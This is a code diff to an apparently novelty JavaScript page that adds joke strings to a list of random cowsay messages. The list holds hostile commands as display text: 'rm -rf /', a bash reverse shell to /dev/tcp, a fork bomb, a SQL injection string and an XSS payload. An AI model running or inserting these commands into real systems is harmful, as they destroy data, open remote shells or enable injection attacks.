@@ -25,9 +25,14 @@ const COWSAY_ASCII =
 
 const RANDOM_MESSAGES = [
     "rm -rf /",
-    "bash -i >& /dev/tcp/192.168.0.55/9001 0>&1",
+    "bash -i >& /dev/tcp/127.0.0.1/9001 0>&1",
     "btw i use arch",
-    "It's not a bug, its a feature."
+    "It's not a bug, its a feature.",
+    "Emacs has a package for that!",
+    ":wq",
+    ":(){ :|: & };:",
+    "' OR 1=1-- -",
+    "<script>alert(1)</script>"
 ];
 
 // Code source: https://dev.to/gnsp/making-the-matrix-effect-in-javascript-din
